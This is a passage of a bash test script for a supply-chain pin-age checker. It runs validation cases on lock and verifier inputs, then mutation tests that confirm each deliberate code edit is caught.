HLVER=- hl_case verifier-object-missing 2 $F "$HLK" "$V" = "$HLK"
HLVEXTRA=1 hl_case verifier-extra-key 2 $F "$HLK" "$V" = "$HLK"
HLVER='"bin/refresh-inputs.sh"' hl_case verifier-not-an-object 2 $F "$HLK" "$V" = "$HLK"
HLVER='{"file": "bin/refresh-inputs.sh"}' hl_case verifier-without-line 2 $F "$HLK" "$V" = "$HLK"
HLVER='{"file": "", "line": "x"}' hl_case verifier-empty-file 2 $F "$HLK" "$V" = "$HLK"
hl_case other-kind-row-with-verifier-fields 2 $F "$HLK" "$V" = "$HLK" 'pinned fetch, advisor reading Oct 17 (REQ-SUP-001-AC26): '
# the lock: missing, removed at the head, a link, empty, 501 rows, a malformed row, a repeated row
hl_case lock-missing 1 $F "$HLK" - = "$HLK"
hl_case lock-removed-at-head 1 $F "$HLK" "$V" - "$HLK"
hl_case lock-is-a-symlink 2 $F "$HLK" "$V" @link "$HLK"
hl_case lock-empty 2 $F "$HLK" "$V" @empty "$HLK"
hl_case lock-501-rows 2 $F "$HLK" "$V" @many "$HLK"
hl_case lock-sha-63-hex 2 $F "$HLK" "$V" "${V%?}" "$HLK"
hl_case lock-sha-65-hex 2 $F "$HLK" "$V" "${V}a" "$HLK"
hl_case lock-sha-upper-case 2 $F "$HLK" "$V" "${V/3ff658cf/3FF658CF}" "$HLK"
hl_case lock-row-without-sha 2 $F "$HLK" "$V" "linux-virt=6.18.60-r0" "$HLK"
hl_case lock-row-version-not-a-pin 2 $F "$HLK" "$V" "${V/6.18.60-r0/latest}" "$HLK"
hl_case lock-row-repeated 2 $F "$HLK" "$V" "$V"$'\n'"$V" "$HLK"
# round 2 seat B, P5: a lock with carriage returns is refused again (as at 9ec03778)
hl_case lock-crlf-head 1 $F "$HLK" "$V" "$V"$'\r' "$HLK"
hl_case lock-crlf-base-and-head 1 $F "$HLK" "$V"$'\r' = "$HLK"
hl_case lock-comment-invalid-byte-base 2 $F "$HLK" "# "$'\xff'$'\n'"$V" = "$HLK"
hl_case lock-comment-invalid-byte-head 2 $F "$HLK" "$V" "# "$'\xff'$'\n'"$V" "$HLK"
hl_exec "$chk"
for n in "${HLN[@]}"; do
  CASE="hash-locked fetch (AC35), $n: exit ${HLW[$n]}$([ "${HLW[$n]}" -eq 0 ] && echo ', ruled under the new prefix' || true)"
  if [[ " $HLBAD " == *" $n "* ]]; then bad "$CASE"; else ok "$CASE"; fi
done
# --- mutants: one edit each of the tagged lines (see the contract above), in a temp copy of the scripts; every mutant must make at least one case above fail --------------------------
hl_mutant() { # NAME MODE ARG: MODE tag (the line `if ...:  # HL:ARG` becomes `if False:`), head (`rev = head  # HL:head` reads HEAD~1), prefix (HASH_LOCKED_RULING leaves the accepted tuple)
  local m="$work/hlmut/$1" rcm=0; rm -rf "${work:?}/hlmut/$1"; mkdir -p "$m"; cp -R "$here/../supply-chain/." "$m/"
  python3 - "$m/pin-age-check.py" "$2" "$3" <<'PY' || rcm=$?
import re, sys
p, mode, arg = sys.argv[1:4]; s = open(p).read()
if mode == "tag":
    pat = re.compile(r"^(\s*)if (.*):(\s*)# HL:" + re.escape(arg) + r"[ \t]*$", re.M); n = len(pat.findall(s)); s = pat.sub(r"\1if False:\3# HL:" + arg, s)
elif mode == "head":
    pat = re.compile(r"^(\s*)rev = head(\s*)# HL:head[ \t]*$", re.M); n = len(pat.findall(s)); s = pat.sub(r'\1rev = "HEAD~1"\2# HL:head', s)
else:
    old = ", HASH_LOCKED_RULING)) for r in rs):"; n = s.count(old); s = s.replace(old, ")) for r in rs):")
sys.exit(3) if n != 1 else open(p, "w").write(s)
PY
  CASE="hash-locked fetch mutant $1: the edit applies (its tagged line is in pin-age-check.py exactly once)"
  if [ "$rcm" -ne 0 ]; then echo "PENDING-CODE: mutant $1 cannot apply ($2 $3)"; bad "$CASE"; return 0; fi
  hl_exec "$m/pin-age-check.py" stop
  CASE="hash-locked fetch mutant $1 is killed (a case above fails)"
  if [ -n "$HLBAD" ]; then ok "$CASE"; echo "mutant killed: $1 (first failing case:$HLBAD)"; else bad "$CASE"; echo "mutant SURVIVED: $1"; fi
}
if [ -n "$HLBAD" ] || ! grep -q 'HASH_LOCKED_RULING' "$chk"; then
  CASE="hash-locked fetch mutants need a green baseline and the code contract (cases failing now:${HLBAD:- none})"; echo "PENDING-CODE: the mutants below are not run until every case above passes on the real code"; bad "$CASE"
else
  hl_mutant gate-removed tag gate
  hl_mutant file-check-dropped tag file
  hl_mutant host-check-dropped tag host
  hl_mutant path-check-dropped tag path
  hl_mutant second-operand-accepted tag operands
  hl_mutant flags-check-dropped tag flags
  hl_mutant raw-line-check-dropped tag raw
  hl_mutant die-text-check-dropped tag die
  hl_mutant lock-check-dropped tag lock
  hl_mutant verifier-check-dropped tag verifier
  hl_mutant verifier-sha-check-dropped tag verifier-sha
  hl_mutant lock-read-from-the-base head head
  hl_mutant prefix-not-accepted prefix prefix
fi
# --- HLF-END

echo "pin-age-check: $pass passed, $failn failed"
test "$failn" -eq 0
